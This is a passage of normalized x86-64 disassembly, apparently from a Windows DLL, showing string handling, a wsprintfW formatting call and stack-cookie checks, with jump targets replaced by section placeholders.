cmp ecx eax
jne r-xdata
mov rsi r15
inc rbx
mov rcx r13
call sub_18002094c
mov rcx [ rsp + 0x38 ]
call j_sub_18002094c#2
sub_1800094b0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
lea rbp [ rsp - 0x980 ]
sub rsp 0xa80
mov [ rbp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x970 ] rax
mov r12 r9
mov r13 r8
movzx ebx dl
mov rdi rcx
mov ecx 0x30
call sub_180021000
mov [ rsp + 0x50 ] rax
xor r14d r14d
test rax rax
je r-xdata
mov rsi r14
mov rcx rax
call sub_180017520
mov rsi rax
jmp r-xdata
mov r9 r12
mov r8 r13
lea rdx [ rsp + 0x30 ]
mov rcx rdi
call sub_1800092e0
nop
mov rcx [ rsp + 0x30 ]
mov rdx [ rsp + 0x38 ]
cmp rcx rdx
jne r-xdata
dec r11d
je r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800175a0
movzx r11d bl
sub r11d 0x65
je r-xdata
sub rdx rcx
mov rax 0x6666666666666667
imul rdx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x3
je r-xdata
test rcx rcx
je r-xdata
mov r9 r12
mov r8 r13
lea rdx [ rsp + 0x30 ]
mov rcx rdi
call sub_1800092e0
nop
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x38 ]
cmp rax rcx
jne r-xdata
dec r11d
je r-xdata
mov rdx rcx
lea rcx [ rbp + 0x230 ]
call sub_180002200
mov r8 rax
lea rdx [ rbp + 0x4b0 ]
mov rcx rdi
call sub_180008c70
nop
cmp [ rbp + 0x4c0 ] 0x0
jne r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov r8d 0x78
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x230 ]
mov rcx rsi
call sub_180017bc0
mov rdx rax
mov rcx rdi
call sub_180008600
jmp r-xdata
jmp r-xdata
sub rcx rax
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x3
je r-xdata
test rax rax
je r-xdata
mov r9 r12
mov r8 r13
lea rdx [ rsp + 0x30 ]
mov rcx rdi
call sub_1800092e0
nop
mov r8 [ rsp + 0x30 ]
mov rcx [ rsp + 0x38 ]
cmp r8 rcx
jne r-xdata
dec r11d
je r-xdata
mov r8d 0x10
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x4d8 ]
mov rcx rsi
call sub_180017bc0
nop
mov rcx [ rsp + 0x30 ]
add rcx 0x50
mov rdx [ rw-data ]
call sub_1800076c0
mov rdx [ rsp + 0x30 ]
add rdx 0x28
test al al
je r-xdata
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov r12 [ rsp + 0x38 ]
cmp rbx r12
je r-xdata
test rsi rsi
je r-xdata
call j_sub_18002094c#2
mov r8d 0x10
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
mov rdx [ rsp + 0x30 ]
lea rcx [ rbp + 0x460 ]
call sub_180002200
mov r8 rax
lea rdx [ rbp + 0x4b0 ]
mov rcx rdi
call sub_180008c70
nop
cmp [ rbp + 0x4c0 ] 0x0
jne r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rcx rax
jmp r-xdata
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x3
jae r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
mov r9 r12
mov r8 r13
lea rdx [ rsp + 0x30 ]
mov rcx rdi
call sub_1800092e0
nop
mov r8 [ rsp + 0x30 ]
mov rcx [ rsp + 0x38 ]
cmp r8 rcx
jne r-xdata
dec r11d
je r-xdata
lea rax [ rbp + 0x2a8 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x2a8 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0x1d0 ] 0x7
mov [ rbp + 0x1c8 ] r14
mov [ rbp + 0x1b8 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0x1b8 ]
call sub_180001ba0
nop
xor r9d r9d
lea rdx [ rbp + 0x1b8 ]
lea rax [ rbp + 0x258 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x258 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0x180 ] 0x7
mov [ rbp + 0x178 ] r14
mov [ rbp + 0x168 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0x168 ]
call sub_180001ba0
nop
mov r9b 0x1
lea rdx [ rbp + 0x168 ]
jmp r-xdata
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov rcx rbx
nop [ rax ] eax
mov al 0x1
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
lea rdx [ rbp + 0x4d8 ]
mov rcx rsi
call sub_180017bc0
nop
mov rcx [ rsp + 0x30 ]
add rcx 0x50
mov rdx [ rw-data ]
call sub_1800076c0
mov rdx [ rsp + 0x30 ]
add rdx 0x28
test al al
je r-xdata
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov r12 [ rsp + 0x38 ]
cmp rbx r12
je r-xdata
mov rdx r8
lea rcx [ rbp + 0x488 ]
call sub_180002200
mov r8 rax
lea rdx [ rbp + 0x4b0 ]
mov rcx rdi
call sub_180008c70
nop
cmp [ rbp + 0x4c0 ] 0x0
jne r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x3
je r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
mov r9 r12
mov r8 r13
lea rdx [ rsp + 0x30 ]
mov rcx rdi
call sub_1800092e0
nop
mov r8 [ rsp + 0x30 ]
mov rcx [ rsp + 0x38 ]
cmp r8 rcx
jne r-xdata
mov r8d 0x64
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x398 ]
mov rcx rsi
call sub_180017bc0
mov rdx rax
mov rcx rdi
call sub_180008600
test rsi rsi
je r-xdata
mov [ rbp + 0x658 ] 0x7
mov [ rbp + 0x650 ] r14
mov [ rbp + 0x640 ] r14w
mov r8d 0x82
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x5f0 ]
mov rcx rsi
call sub_180017bc0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008240
nop
cmp [ rbp + 0x608 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x640 ]
call j_sub_18002094c#2
mov [ rsp + 0x20 ] 0x0
mov r8 rbx
mov rcx [ rdi + 0x10 ]
call sub_1800191b0
lea rdx [ rbp + 0x640 ]
mov rcx [ rdi + 0x10 ]
call sub_180019140
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008240
nop
cmp [ rbp + 0x658 ] 0x8
jb r-xdata
mov r12 [ rsp + 0x38 ]
cmp rbx r12
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx r12
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
lea rax [ rbp + 0x208 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x208 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0xe0 ] 0x7
mov [ rbp + 0xd8 ] r14
mov [ rbp + 0xc8 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0xc8 ]
call sub_180001ba0
nop
xor r9d r9d
lea rdx [ rbp + 0xc8 ]
lea rax [ rbp + 0x2f8 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x2f8 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0x90 ] 0x7
mov [ rbp + 0x88 ] r14
mov [ rbp + 0x78 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0x78 ]
call sub_180001ba0
nop
mov r9b 0x1
lea rdx [ rbp + 0x78 ]
jmp r-xdata
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
nop [ rax ] eax
mov [ rbp + 0x568 ] 0x7
mov [ rbp + 0x560 ] r14
mov [ rbp + 0x550 ] r14w
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rbp + 0x550 ]
call sub_180003930
nop
lea r8 [ rbp + 0x550 ]
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0x618 ]
call sub_1800089c0
nop
mov r8 [ rsp + 0x30 ]
add r8 0x28
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008960
nop
cmp [ rbp + 0x630 ] 0x8
jb r-xdata
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rdx r8
lea rcx [ rbp + 0x438 ]
call sub_180002200
mov r8 rax
lea rdx [ rbp + 0x4b0 ]
mov rcx rdi
call sub_180008c70
nop
cmp [ rbp + 0x4c0 ] 0x0
jne r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
sub rcx r8
mov rbx 0x6666666666666667
mov rax rbx
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x4
ja r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
xor al al
jmp r-xdata
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
mov [ rbp + 0x608 ] 0x7
mov [ rbp + 0x600 ] r14
mov [ rbp + 0x5f0 ] r14w
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] r14
mov [ rbp - 0x30 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4d8 ]
lea rcx [ rbp - 0x30 ]
call sub_180001ba0
lea rdx [ rbp - 0x30 ]
mov rcx rdi
call sub_180008600
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
cmp [ rbp + 0x4f0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5f0 ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
jmp r-xdata
mov [ rbp + 0x680 ] 0x7
mov [ rbp + 0x678 ] r14
mov [ rbp + 0x668 ] r14w
mov r8d 0x82
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x6b8 ]
mov rcx rsi
call sub_180017bc0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008240
nop
cmp [ rbp + 0x6d0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x668 ]
call j_sub_18002094c#2
mov [ rsp + 0x20 ] 0x1
mov r8 rbx
mov rcx [ rdi + 0x10 ]
call sub_1800191b0
lea rdx [ rbp + 0x668 ]
mov rcx [ rdi + 0x10 ]
call sub_180019140
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008240
nop
cmp [ rbp + 0x680 ] 0x8
jb r-xdata
mov r12 [ rsp + 0x38 ]
cmp rbx r12
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx r12
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rbp + 0x630 ] 0x7
mov [ rbp + 0x628 ] r14
mov [ rbp + 0x618 ] r14w
cmp [ rbp + 0x568 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x618 ]
call j_sub_18002094c#2
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov r8d 0x10
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x4d8 ]
mov rcx rsi
call sub_180017bc0
nop
mov rcx [ rsp + 0x30 ]
add rcx 0x50
mov rdx [ rw-data ]
call sub_1800076c0
mov rdx [ rsp + 0x30 ]
add rdx 0x28
test al al
je r-xdata
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
cmp rdx 0x3
jb r-xdata
mov rcx [ rbp + 0x970 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xa80
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov [ rbp + 0x4f0 ] 0x7
mov [ rbp + 0x4e8 ] r14
mov [ rbp + 0x4d8 ] r14w
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4d8 ]
call j_sub_18002094c#2
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx r12
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rbx [ rsp + 0x30 ]
mov [ rbp + 0x6d0 ] 0x7
mov [ rbp + 0x6c8 ] r14
mov [ rbp + 0x6b8 ] r14w
mov [ rbp + 0x130 ] 0x7
mov [ rbp + 0x128 ] r14
mov [ rbp + 0x118 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4d8 ]
lea rcx [ rbp + 0x118 ]
call sub_180001ba0
lea rdx [ rbp + 0x118 ]
mov rcx rdi
call sub_180008600
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
cmp [ rbp + 0x4f0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x6b8 ]
call j_sub_18002094c#2
nop [ rax ] eax
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
jmp r-xdata
mov [ rbp + 0x568 ] 0x7
mov [ rbp + 0x560 ] r14
mov [ rbp + 0x550 ] r14w
mov [ rbp - 0x68 ] 0x7
mov [ rbp - 0x70 ] r14
mov [ rbp - 0x80 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4d8 ]
lea rcx [ rbp - 0x80 ]
call sub_180001ba0
mov r11 [ rbp + 0x4e8 ]
add r11 r11
sub r12 r11
lea r8 [ r11 + r13 ]
mov r9 r12
lea rdx [ rbp - 0x80 ]
mov rcx [ rdi + 0x10 ]
call sub_1800183d0
movzx ebx al
lea rdx [ rbp + 0x578 ]
mov rcx [ rdi + 0x10 ]
call sub_180019140
nop
mov r8d 0x8a
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x5a0 ]
mov rcx rsi
call sub_180017bc0
nop
mov r8d 0xa2
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x5c8 ]
mov rcx rsi
call sub_180017bc0
nop
mov [ rbp + 0x760 ] r14w
xor edx edx
mov r8d 0x206
lea rcx [ rbp + 0x762 ]
call sub_180021150
test bl 0x1
lea rdx [ rbp + 0x5a0 ]
lea rax [ rbp + 0x5c8 ]
cmove rdx rax
mov [ rbp + 0x518 ] 0x7
mov [ rbp + 0x510 ] r14
mov [ rbp + 0x500 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp + 0x500 ]
call sub_180001ba0
lea r8 [ rbp + 0x4d8 ]
cmp [ rbp + 0x4f0 ] 0x8
cmovae r8 [ rbp + 0x4d8 ]
lea rdx [ rbp + 0x500 ]
cmp [ rbp + 0x518 ] 0x8
cmovae rdx [ rbp + 0x500 ]
lea rcx [ rbp + 0x760 ]
call [ wsprintfW@IAT ]
movsxd rbx eax
cmp [ rbp + 0x518 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x550 ]
call j_sub_18002094c#2
lea rax [ rbp + 0x348 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x348 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0x10 ] 0x7
mov [ rbp + 0x8 ] r14
mov [ rbp - 0x8 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp - 0x8 ]
call sub_180001ba0
nop
xor r9d r9d
lea rdx [ rbp - 0x8 ]
lea rax [ rbp + 0x370 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x370 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0x158 ] 0x7
mov [ rbp + 0x150 ] r14
mov [ rbp + 0x140 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0x140 ]
call sub_180001ba0
nop
mov r9b 0x1
lea rdx [ rbp + 0x140 ]
jmp r-xdata
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov rdx r8
lea rcx [ rbp + 0x410 ]
call sub_180002200
mov r8 rax
lea rdx [ rbp + 0x4b0 ]
mov rcx rdi
call sub_180008c70
nop
cmp [ rbp + 0x4c0 ] 0x0
jne r-xdata
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov [ rbp + 0x4f0 ] 0x7
mov [ rbp + 0x4e8 ] r14
mov [ rbp + 0x4d8 ] r14w
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4d8 ]
call j_sub_18002094c#2
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx r12
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rbp + 0x518 ] 0x7
mov [ rbp + 0x510 ] r14
mov [ rbp + 0x500 ] r14w
mov [ rbp + 0x540 ] 0x7
mov [ rbp + 0x538 ] r14
mov [ rbp + 0x528 ] r14w
mov r8 rbx
lea rdx [ rbp + 0x760 ]
lea rcx [ rbp + 0x528 ]
call sub_180003930
nop
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x528 ]
lea rcx [ rbp + 0x578 ]
call sub_180008240
nop
cmp [ rbp + 0x540 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x500 ]
call j_sub_18002094c#2
mov [ rbp + 0x6a8 ] 0x7
mov [ rbp + 0x6a0 ] r14
mov [ rbp + 0x690 ] r14w
mov r8d 0x82
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x730 ]
mov rcx rsi
call sub_180017bc0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008240
nop
cmp [ rbp + 0x748 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x690 ]
call j_sub_18002094c#2
mov [ rsp + 0x20 ] 0x2
mov r8 rbx
mov rcx [ rdi + 0x10 ]
call sub_1800191b0
lea rdx [ rbp + 0x690 ]
mov rcx [ rdi + 0x10 ]
call sub_180019140
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008240
nop
cmp [ rbp + 0x6a8 ] 0x8
jb r-xdata
mov r8d 0x10
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x4d8 ]
mov rcx rsi
call sub_180017bc0
nop
mov rcx [ rsp + 0x38 ]
mov r8 [ rsp + 0x30 ]
sub rcx r8
mov rax rbx
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
sub rdx 0x3
je r-xdata
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rdi [ rsp + 0x38 ]
cmp rbx rdi
je r-xdata
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
jmp r-xdata
mov [ rbp + 0x540 ] 0x7
mov [ rbp + 0x538 ] r14
mov [ rbp + 0x528 ] r14w
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] r14
mov [ rbp - 0x58 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x578 ]
lea rcx [ rbp - 0x58 ]
call sub_180001ba0
lea rdx [ rbp - 0x58 ]
mov rcx rdi
call sub_180008600
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
cmp [ rbp + 0x5e0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x528 ]
call j_sub_18002094c#2
mov [ rbp + 0x748 ] 0x7
mov [ rbp + 0x740 ] r14
mov [ rbp + 0x730 ] r14w
mov [ rsp + 0x70 ] 0x7
mov [ rsp + 0x68 ] r14
mov [ rsp + 0x58 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4d8 ]
lea rcx [ rsp + 0x58 ]
call sub_180001ba0
lea rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_180008600
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
cmp [ rbp + 0x4f0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x730 ]
call j_sub_18002094c#2
lea rcx [ r8 + 0x50 ]
mov rdx [ rw-data ]
call sub_1800076c0
mov rdx [ rsp + 0x30 ]
add rdx 0x28
test al al
je r-xdata
dec rdx
jne r-xdata
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov rcx rbx
call j_sub_18002094c#2
nop
mov rdi [ rsp + 0x38 ]
cmp rbx rdi
je r-xdata
mov [ rbp + 0x5e0 ] 0x7
mov [ rbp + 0x5d8 ] r14
mov [ rbp + 0x5c8 ] r14w
cmp [ rbp + 0x5b8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5c8 ]
call j_sub_18002094c#2
mov [ rbp + 0x4f0 ] 0x7
mov [ rbp + 0x4e8 ] r14
mov [ rbp + 0x4d8 ] r14w
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4d8 ]
call j_sub_18002094c#2
lea rax [ rbp + 0x2d0 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x2d0 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0x1a8 ] 0x7
mov [ rbp + 0x1a0 ] r14
mov [ rbp + 0x190 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0x190 ]
call sub_180001ba0
nop
xor r9d r9d
lea rdx [ rbp + 0x190 ]
lea rax [ rbp + 0x320 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x320 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0x68 ] 0x7
mov [ rbp + 0x60 ] r14
mov [ rbp + 0x50 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0x50 ]
call sub_180001ba0
nop
mov r9b 0x1
lea rdx [ rbp + 0x50 ]
jmp r-xdata
lea rdx [ rbp + 0x708 ]
mov rcx [ rdi + 0x10 ]
call sub_180019140
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008240
nop
cmp [ rbp + 0x720 ] 0x8
jb r-xdata
lea rdx [ r8 + 0x50 ]
lea rcx [ rbp + 0x3c0 ]
call sub_180002200
mov rdx rax
mov rcx [ rdi + 0x10 ]
call sub_180008570
mov rcx [ rsp + 0x30 ]
add rcx 0x78
mov rdx [ rw-data ]
call sub_1800076c0
mov rdx [ rsp + 0x30 ]
add rdx 0x28
test al al
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
nop [ rax + rax ] eax
mov [ rbp + 0x5b8 ] 0x7
mov [ rbp + 0x5b0 ] r14
mov [ rbp + 0x5a0 ] r14w
cmp [ rbp + 0x590 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5a0 ]
call j_sub_18002094c#2
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov [ rbp + 0x720 ] 0x7
mov [ rbp + 0x718 ] r14
mov [ rbp + 0x708 ] r14w
mov r8d 0x82
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x6e0 ]
mov rcx rsi
call sub_180017bc0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008240
nop
cmp [ rbp + 0x6f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x708 ]
call j_sub_18002094c#2
mov [ rsp + 0x20 ] 0x3
mov r8 rbx
mov rcx [ rdi + 0x10 ]
call sub_1800191b0
lea rax [ rbp + 0x280 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x280 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0x108 ] 0x7
mov [ rbp + 0x100 ] r14
mov [ rbp + 0xf0 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0xf0 ]
call sub_180001ba0
nop
xor r9d r9d
lea rdx [ rbp + 0xf0 ]
lea rax [ rbp + 0x1e0 ]
mov [ rsp + 0x50 ] rax
lea rcx [ rbp + 0x1e0 ]
call sub_180002200
mov rbx rax
mov [ rbp + 0x38 ] 0x7
mov [ rbp + 0x30 ] r14
mov [ rbp + 0x20 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4b0 ]
lea rcx [ rbp + 0x20 ]
call sub_180001ba0
nop
mov r9b 0x1
lea rdx [ rbp + 0x20 ]
jmp r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x30 ]
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rbp + 0x590 ] 0x7
mov [ rbp + 0x588 ] r14
mov [ rbp + 0x578 ] r14w
cmp [ rbp + 0x4f0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x578 ]
call j_sub_18002094c#2
mov [ rbp + 0x6f8 ] 0x7
mov [ rbp + 0x6f0 ] r14
mov [ rbp + 0x6e0 ] r14w
mov [ rbp + 0xb8 ] 0x7
mov [ rbp + 0xb0 ] r14
mov [ rbp + 0xa0 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x4d8 ]
lea rcx [ rbp + 0xa0 ]
call sub_180001ba0
lea rdx [ rbp + 0xa0 ]
mov rcx rdi
call sub_180008600
lea rcx [ rsp + 0x30 ]
call sub_180004ff0
nop
cmp [ rbp + 0x4f0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x6e0 ]
call j_sub_18002094c#2
mov [ rsp + 0x20 ] 0x3
mov r8 rbx
mov rcx [ rdi + 0x10 ]
call sub_1800191b0
lea rdx [ r--data ]
lea rcx [ rbp + 0x3e8 ]
call sub_180004030
mov rdx rax
mov rcx [ rdi + 0x10 ]
call sub_180008570
jmp r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
jmp r-xdata
mov [ rbp + 0x4f0 ] 0x7
mov [ rbp + 0x4e8 ] r14
mov [ rbp + 0x4d8 ] r14w
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4d8 ]
